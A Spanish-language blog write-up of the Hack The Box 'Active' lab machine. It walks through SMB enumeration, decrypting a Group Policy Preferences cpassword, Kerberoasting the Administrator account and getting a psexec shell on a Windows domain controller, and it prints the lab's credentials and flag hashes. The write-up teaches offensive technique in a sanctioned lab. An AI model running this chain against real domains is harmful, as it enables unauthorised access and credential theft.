---
layout: single
title: Active - Hack The Box
excerpt: "Ésta máquina tiene una dificultad en Hack The Box de Easy. Es una máquina Windows, domain controler, bastante facililla, así que vamos a ello"
date: 2021-9-19
classes: wide
header:
  teaser: /assets/images/htb-writeup-active/active_logo.png
  teaser_home_page: true
  icon: /assets/images/hackthebox.webp
categories:
   - hackthebox
   - infosec
tags:
    - linux
    - active directory
    - smb
    - crackmapexec
    - psexec
    - ticket tgt
---

![](/assets/images/htb-writeup-active/active_logo.png)

# Reconocimiento

Primero vamos a realizar un reconocimiento de puertos por el protocolo **TCP**, y el output lo redigiremos al archivo `allPorts`

```bash

h3g0c1v@kali:~/htb/active$ nmap -p- --open -T5 -v -n 10.10.10.100 -oG allPorts
Starting Nmap 7.91 ( https://nmap.org ) at 2021-09-19 13:59 CEST
Initiating Ping Scan at 13:59
Scanning 10.10.10.100 [4 ports]
Completed Ping Scan at 13:59, 0.07s elapsed (1 total hosts)
Initiating SYN Stealth Scan at 13:59
Scanning 10.10.10.100 [65535 ports]
Discovered open port 135/tcp on 10.10.10.100
Discovered open port 445/tcp on 10.10.10.100
Discovered open port 53/tcp on 10.10.10.100
Discovered open port 139/tcp on 10.10.10.100
Discovered open port 49172/tcp on 10.10.10.100
Discovered open port 9389/tcp on 10.10.10.100
Discovered open port 49169/tcp on 10.10.10.100
Discovered open port 389/tcp on 10.10.10.100
Discovered open port 49152/tcp on 10.10.10.100
Discovered open port 3269/tcp on 10.10.10.100
Discovered open port 49158/tcp on 10.10.10.100
Discovered open port 49157/tcp on 10.10.10.100
Discovered open port 464/tcp on 10.10.10.100
Discovered open port 47001/tcp on 10.10.10.100
Discovered open port 49182/tcp on 10.10.10.100
Discovered open port 3268/tcp on 10.10.10.100
Discovered open port 49153/tcp on 10.10.10.100
Discovered open port 636/tcp on 10.10.10.100
Discovered open port 49154/tcp on 10.10.10.100
Discovered open port 5722/tcp on 10.10.10.100
Discovered open port 49155/tcp on 10.10.10.100
Discovered open port 88/tcp on 10.10.10.100
Discovered open port 593/tcp on 10.10.10.100
Completed SYN Stealth Scan at 14:00, 14.57s elapsed (65535 total ports)
Nmap scan report for 10.10.10.100
Host is up (0.032s latency).
Not shown: 61499 closed ports, 4013 filtered ports
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT      STATE SERVICE
53/tcp    open  domain
88/tcp    open  kerberos-sec
135/tcp   open  msrpc
139/tcp   open  netbios-ssn
389/tcp   open  ldap
445/tcp   open  microsoft-ds
464/tcp   open  kpasswd5
593/tcp   open  http-rpc-epmap
636/tcp   open  ldapssl
3268/tcp  open  globalcatLDAP
3269/tcp  open  globalcatLDAPssl
5722/tcp  open  msdfsr
9389/tcp  open  adws
47001/tcp open  winrm
49152/tcp open  unknown
49153/tcp open  unknown
49154/tcp open  unknown
49155/tcp open  unknown
49157/tcp open  unknown
49158/tcp open  unknown
49169/tcp open  unknown
49172/tcp open  unknown
49182/tcp open  unknown

```

Bueno hay un monton de puertos abiertos, por lo que vamos a extraer los puertos con la utilidad que tengo previamente definida en la `.zshrc`. Dicha utilidad está creada por s4vitar

```bash
h3g0c1v@kali:~/htb/active$ extractPorts allPorts
───────┬───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
       │ File: extractPorts.tmp
───────┼───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
   1   │ 
   2   │ [*] Extracting information...
   3   │ 
   4   │     [*] IP Address: 10.10.10.100
   5   │     [*] Open ports: 53,88,135,139,389,445,464,593,636,3268,3269,5722,9389,47001,49152,49153,49154,49155,49157,49158,49169,49172,49182
   6   │ 
   7   │ [*] Ports copied to clipboard
   8   │ 
───────┴───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
```

Perfecto ahora vamos a ver la versión y servicio que corren bajo los **puertos abiertos**, y el output lo redigiremos al archivo `targeted`.

```bash
h3g0c1v@kali:~/htb/active$ nmap -sCV -p53,88,135,139,389,445,464,593,636,3268,3269,5722,9389,47001,49152,49153,49154,49155,49157,49158,49169,49172,49182 10.10.10.100 -oN targeted  
Starting Nmap 7.91 ( https://nmap.org ) at 2021-09-19 14:05 CEST
Nmap scan report for active.htb (10.10.10.100)
Host is up (0.032s latency).

PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Microsoft DNS 6.1.7601 (1DB15D39) (Windows Server 2008 R2 SP1)
| dns-nsid: 
|_  bind.version: Microsoft DNS 6.1.7601 (1DB15D39)
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2021-09-19 12:13:59Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: active.htb, Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: active.htb, Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped
5722/tcp  open  msrpc         Microsoft Windows RPC
9389/tcp  open  mc-nmf        .NET Message Framing
47001/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
49152/tcp open  msrpc         Microsoft Windows RPC
49153/tcp open  msrpc         Microsoft Windows RPC
49154/tcp open  msrpc         Microsoft Windows RPC
49155/tcp open  msrpc         Microsoft Windows RPC
49157/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
49158/tcp open  msrpc         Microsoft Windows RPC
49169/tcp open  msrpc         Microsoft Windows RPC
49172/tcp open  msrpc         Microsoft Windows RPC
49182/tcp open  msrpc         Microsoft Windows RPC
Service Info: Host: DC; OS: Windows; CPE: cpe:/o:microsoft:windows_server_2008:r2:sp1, cpe:/o:microsoft:windows

Host script results:
|_clock-skew: 8m14s
| smb2-security-mode: 
|   2.02: 
|_    Message signing enabled and required
| smb2-time: 
|   date: 2021-09-19T12:14:55
|_  start_date: 2021-09-19T08:52:50


```

Bien como veo que el puerto **88** está abierto, voy a ver con **crackmapexec** a ver que nos dice.

```bash
h3g0c1v@kali:~/htb/active$ crackmapexec smb 10.10.10.100                                         
SMB         10.10.10.100    445    DC               [*] Windows 6.1 Build 7601 x64 (name:DC) (domain:active.htb) (signing:True) (SMBv1:False)

```

Y vemos que es un **Domain Controler** , y que hay un, dominio por lo que vamos a meterlo en el `/etc/hosts` , por si acaso se está utilizando **Virtual Hosting**.

```bash
h3g0c1v@kali:~/htb/active$ cat /etc/hosts                                         
───────┬───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
       │ File: /etc/hosts
───────┼───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
   1   │ 127.0.0.1   localhost
   2   │ 127.0.1.1   kali
   3   │ 
   4   │ 10.10.10.100    active.htb
   5   │ 
   6   │ # The following lines are desirable for IPv6 capable hosts
   7   │ ::1     localhost ip6-localhost ip6-loopback
   8   │ ff02::1 ip6-allnodes
   9   │ ff02::2 ip6-allrouters
───────┴───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────

```

Ahora vamos a ver con **smbclient** los recursos compartidos a nivel de red.

```bash
h3g0c1v@kali:~/htb/active$ smbclient -L 10.10.10.100 -N
Anonymous login successful

	Sharename       Type      Comment
	---------       ----      -------
	ADMIN$          Disk      Remote Admin
	C$              Disk      Default share
	IPC$            IPC       Remote IPC
	NETLOGON        Disk      Logon server share 
	Replication     Disk      
	SYSVOL          Disk      Logon server share 
	Users           Disk      
SMB1 disabled -- no workgroup available


```

Y vemos unos cuantos, pero lo que a mi me intersa es ver cuales nos podemos meter o visualizar el contenido del recurso. Asi que vamos a ver con **smbmap**.

```bash
h3g0c1v@kali:~/htb/active$ smbmap -H 10.10.10.100
[+] IP: 10.10.10.100:445	Name: active.htb                                        
        Disk                                                  	Permissions	Comment
	----                                                  	-----------	-------
	ADMIN$                                            	NO ACCESS	Remote Admin
	C$                                                	NO ACCESS	Default share
	IPC$                                              	NO ACCESS	Remote IPC
	NETLOGON                                          	NO ACCESS	Logon server share 
	Replication                                       	READ ONLY	
	SYSVOL                                            	NO ACCESS	Logon server share 
	Users                                             	NO ACCESS	


```

Vale, podemos leer el contenido del recurso compartido a nivel de red **Replication**. Por lo que vamos a ver que contiene.

```bash
h3g0c1v@kali:~/htb/active$ smbmap -H 10.10.10.100 -r Replication
[+] IP: 10.10.10.100:445	Name: active.htb                                        
        Disk                                                  	Permissions	Comment
	----                                                  	-----------	-------
	Replication                                       	READ ONLY	
	.\Replication\*
	dr--r--r--                0 Sat Jul 21 12:37:44 2018	.
	dr--r--r--                0 Sat Jul 21 12:37:44 2018	..
	dr--r--r--                0 Sat Jul 21 12:37:44 2018	active.htb

```

Vemos un directorio `active.htb` , así que vamos a meternos dentro a ver que hay. 

```bash
h3g0c1v@kali:~/htb/active$ smbmap -H 10.10.10.100 -r Replication/active.htb
[+] IP: 10.10.10.100:445	Name: active.htb                                        
        Disk                                                  	Permissions	Comment
	----                                                  	-----------	-------
	Replication                                       	READ ONLY	
	.\Replicationactive.htb\*
	dr--r--r--                0 Sat Jul 21 12:37:44 2018	.
	dr--r--r--                0 Sat Jul 21 12:37:44 2018	..
	dr--r--r--                0 Sat Jul 21 12:37:44 2018	DfsrPrivate
	dr--r--r--                0 Sat Jul 21 12:37:44 2018	Policies
	dr--r--r--                0 Sat Jul 21 12:37:44 2018	scripts


```

Ahora se pone mas interesante. 

Ésta estructura de archivos se parece a un **sysvol** ,  por lo que hay que buscar un archivo `groups.xml`, porque ahí se suelen almacenar credenciales **hasheadas**. Vamos a ver si lo hay.

```bash
h3g0c1v@kali:~/htb/active$ smbmap -H 10.10.10.100 -r Replication/active.htb/Policies/{31B2F340-016D-11D2-945F-00C04FB984F9}/MACHINE/Preferences/Groups
[+] IP: 10.10.10.100:445	Name: active.htb                                        
        Disk                                                  	Permissions	Comment
	----                                                  	-----------	-------
	Replication                                       	READ ONLY	
	.\Replicationactive.htb\Policies\{31B2F340-016D-11D2-945F-00C04FB984F9}\MACHINE\Preferences\Groups\*
	dr--r--r--                0 Sat Jul 21 12:37:44 2018	.
	dr--r--r--                0 Sat Jul 21 12:37:44 2018	..
	fr--r--r--              533 Sat Jul 21 12:38:11 2018	Groups.xml

```

Y si que lo hay, asi que vamos a descargarlo a nuestro equipo.

```bash
h3g0c1v@kali:~/htb/active$ smbmap -H 10.10.10.100 --download Replication/active.htb/Policies/{31B2F340-016D-11D2-945F-00C04FB984F9}/MACHINE/Preferences/Groups/Groups.xml
[+] Starting download: Replication\active.htb\Policies\{31B2F340-016D-11D2-945F-00C04FB984F9}\MACHINE\Preferences\Groups\Groups.xml (533 bytes)
[+] File output to: /home/kali/Escritorio/HTB/MachinesHTB/Active/nmap/10.10.10.100-Replication_active.htb_Policies_{31B2F340-016D-11D2-945F-00C04FB984F9}_MACHINE_Preferences_Groups_Groups.xml

```

Y procedemos a visualizarlo.

```bash
h3g0c1v@kali:~/htb/active$ cat 10.10.10.100-Replication_active.htb_Policies_\{31B2F340-016D-11D2-945F-00C04FB984F9\}_MACHINE_Preferences_Groups_Groups.xml
───────┬───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
       │ File: 10.10.10.100-Replication_active.htb_Policies_{31B2F340-016D-11D2-945F-00C04FB984F9}_MACHINE_Preferences_Groups_Groups.xml
───────┼───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
   1   │ <?xml version="1.0" encoding="utf-8"?>
   2   │ <Groups clsid="{3125E937-EB16-4b4c-9934-544FC6D24D26}"><User clsid="{DF5F1855-51E5-4d24-8B1A-D9BDE98BA1D1}" name="active.htb\SVC_TGS" imag
       │ e="2" changed="2018-07-18 20:46:06" uid="{EF57DA28-5F69-4530-A59E-AAB58578219D}"><Properties action="U" newName="" fullName="" description
       │ ="" cpassword="edBSHOwhZLTjt/QS9FeIcJ83mjWA98gw9guKOhJOdcqh+ZGMeXOsQbCpZ3xUjTLfCuNH8pG5aSVYdYw/NglVmQ" changeLogon="0" noChange="1" neverE
       │ xpires="1" acctDisabled="0" userName="active.htb\SVC_TGS"/></User>
   3   │ </Groups>
───────┴───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────

```
Vemos que hay un usuario existente y un `cpassword`, asi que vamos a utilizar la herramienta **gpp-decrypt** , para ver si la podemos crackear, gracias a que Microsoft compartió la **key** , que se utiliza para encriptar esos **hashes**.

```bash
h3g0c1v@kali:~/htb/active$ gpp-decrypt "edBSHOwhZLTjt/QS9FeIcJ83mjWA98gw9guKOhJOdcqh+ZGMeXOsQbCpZ3xUjTLfCuNH8pG5aSVYdYw/NglVmQ"
GPPstillStandingStrong2k18

```

Perfecto, tenemos una **contraseña válida** y el **usuario SVC_TGS** , así que vamos a validar si esa contraseña tiene permisos de **administrador** , con **crackmapexec**.

```bash
h3g0c1v@kali:~/htb/active$ crackmapexec smb 10.10.10.100 -u "SVC_TGS" -p "GPPstillStandingStrong2k18"
SMB         10.10.10.100    445    DC               [*] Windows 6.1 Build 7601 x64 (name:DC) (domain:active.htb) (signing:True) (SMBv1:False)
SMB         10.10.10.100    445    DC               [+] active.htb\SVC_TGS:GPPstillStandingStrong2k18 

```

Y no es válida. Bueno pues vamos a ver ahora, otra vez, los recursos compartidos a nivel de red con las credenciales encontradas, a ver si tenemos algún permiso nuevo para algún recurso.

```bash
h3g0c1v@kali:~/htb/active$ smbmap -H 10.10.10.100 -u "SVC_TGS" -p "GPPstillStandingStrong2k18"
[+] IP: 10.10.10.100:445	Name: active.htb                                        
        Disk                                                  	Permissions	Comment
	----                                                  	-----------	-------
	ADMIN$                                            	NO ACCESS	Remote Admin
	C$                                                	NO ACCESS	Default share
	IPC$                                              	NO ACCESS	Remote IPC
	NETLOGON                                          	READ ONLY	Logon server share 
	Replication                                       	READ ONLY	
	SYSVOL                                            	READ ONLY	Logon server share 
	Users                                             	READ ONLY	

```

Genial, tenemos mas permisos, así que vamos a ver el recuso **Users** , que quiero saber si hay algun que otro usuario que no sepamos.

```bash
h3g0c1v@kali:~/htb/active$ smbmap -H 10.10.10.100 -u "SVC_TGS" -p "GPPstillStandingStrong2k18" -r Users
[+] IP: 10.10.10.100:445	Name: active.htb                                        
        Disk                                                  	Permissions	Comment
	----                                                  	-----------	-------
	Users                                             	READ ONLY	
	.\Users\*
	dw--w--w--                0 Sat Jul 21 16:39:20 2018	.
	dw--w--w--                0 Sat Jul 21 16:39:20 2018	..
	dr--r--r--                0 Mon Jul 16 12:14:21 2018	Administrator
	dr--r--r--                0 Mon Jul 16 23:08:56 2018	All Users
	dw--w--w--                0 Mon Jul 16 23:08:47 2018	Default
	dr--r--r--                0 Mon Jul 16 23:08:56 2018	Default User
	fr--r--r--              174 Mon Jul 16 23:01:17 2018	desktop.ini
	dw--w--w--                0 Mon Jul 16 23:08:47 2018	Public
	dr--r--r--                0 Sat Jul 21 17:16:32 2018	SVC_TGS

```

Y solo hay un solo usuario.

# Conseguimos Acceso a la Máquina

Bien, ahora vamos a ver si hay algun usuario **kerberoasteable** , con la utilidad **GetUserSPNs.py**. 

```bash
h3g0c1v@kali:~/htb/active$ python3 /usr/share/doc/python3-impacket/examples/GetUserSPNs.py active.htb/SVC_TGS:GPPstillStandingStrong2k18         
Impacket v0.9.22 - Copyright 2020 SecureAuth Corporation

ServicePrincipalName  Name           MemberOf                                                  PasswordLastSet             LastLogon                   Delegation 
--------------------  -------------  --------------------------------------------------------  --------------------------  --------------------------  ----------
active/CIFS:445       Administrator  CN=Group Policy Creator Owners,CN=Users,DC=active,DC=htb  2018-07-18 21:06:40.351723  2021-01-21 17:07:03.723783             

```

Perfecto, pues ahora podemos utilizar la utilildad **GetUserSPNs.py** , para obtener el ticket `TGT` del usuario administrador, para luego **crackearlo** con **jhon**.

![](/assets/images/htb-writeup-active/TGT.png)

Probamos si se puede crackear con **jhon**.

![](/assets/images/htb-writeup-active/jhonHashTGT.png)

Y si, se ha podido crackear. Ahora vamos a ver si con el **usuario Administrator** y la contraseña obtenida, nos pone un buen `pwned` con **crackmapexec**.

```bash
h3g0c1v@kali:~/htb/active$ crackmapexec smb 10.10.10.100 -u "Administrator" -p "Ticketmaster1968"
SMB         10.10.10.100    445    DC               [*] Windows 6.1 Build 7601 x64 (name:DC) (domain:active.htb) (signing:True) (SMBv1:False)
SMB         10.10.10.100    445    DC               [+] active.htb\Administrator:Ticketmaster1968 (Pwn3d!)

```

¡Genial! Ahora vamos a poder ganar acceso al sistema, con la utilidad **psexec** .

```bash
h3g0c1v@kali:~/htb/active$ python3 /usr/share/doc/python3-impacket/examples/psexec.py active.htb/Administrator:Ticketmaster1968@10.10.10.100 cmd.exe 
Impacket v0.9.22 - Copyright 2020 SecureAuth Corporation

[*] Requesting shares on 10.10.10.100.....
[*] Found writable share ADMIN$
[*] Uploading file knShNoTL.exe
[*] Opening SVCManager on 10.10.10.100.....
[*] Creating service Srem on 10.10.10.100.....
[*] Starting service Srem.....
[!] Press help for extra shell commands
Microsoft Windows [Version 6.1.7601]
Copyright (c) 2009 Microsoft Corporation.  All rights reserved.

C:\Windows\system32>

```

# Visualizamos las Flags

Ahora podemos visualizar las dos flags, tanto la `user.txt` como la `root.txt`.


Así que primero vamos a ver la `user.txt`.

```bash

C:\Users\SVC_TGS\Desktop>type user.txt
86d67d8ba232bb6a254aa4d10159e983

```

Y la `root.txt`

```bash

C:\Users\Administrator\Desktop>type root.txt
b5fc76d1d6b91d77b2fbf2d54d0f708b

```
